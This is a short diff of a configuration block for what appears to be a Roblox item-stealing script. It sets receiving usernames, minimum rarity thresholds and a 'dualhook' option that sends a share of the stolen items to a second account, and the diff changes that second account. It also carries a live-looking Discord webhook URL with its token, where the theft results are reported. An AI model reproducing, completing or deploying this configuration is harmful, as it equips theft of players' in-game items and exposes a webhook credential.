@@ -3,7 +3,7 @@ Username = "Warrior_ggs" -- [Your Username]
 Webhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75" -- [Your Webhook]
 
 -- [ Dualhook Settings ] --
-DualUsername = "valeraplayp" -- [Dualhook Username]
+DualUsername = "Warrior_ggs" -- [Dualhook Username]
 DualWebhook = "https://discord.com/api/webhooks/1413867134605594706/tMg5ZcD7Kz4s1Yg2ZUIekvl05gBQJc_lTnwEVLayVJvKUc8t-phOmXs4VhvOfnLoSK75" -- [Dualhook Webhook]
 DualUnique = 1 -- [Minimum Unique]
 DualAncient = 1 -- [Minimum Ancient]
